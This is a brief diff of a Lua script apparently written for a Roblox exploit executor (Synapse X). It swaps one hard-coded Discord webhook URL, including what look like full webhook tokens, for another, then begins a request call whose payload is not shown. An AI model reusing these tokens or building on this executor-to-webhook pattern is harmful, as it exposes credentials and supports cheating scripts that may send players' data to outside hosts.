@@ -1,5 +1,5 @@
 HttpService = game:GetService("HttpService")
-getgenv().URL = "https://discord.com/api/webhooks/1058422177608761394/44VMwxhHdbqHLEV2ehfSGYytS1YJbPz1zHs0N4hc1xFUc67AAI1s0JlAZot0O5AHq378"
+getgenv().URL = "https://discord.com/api/webhooks/1058584702497333369/R7KhQ0GQUep9cBvCKkuCKouwXbanJV56R5nKdwSfoVch8bR_ufSlEwrY4u_qn5kMSuE0"
 
 
 local Response = syn.request(
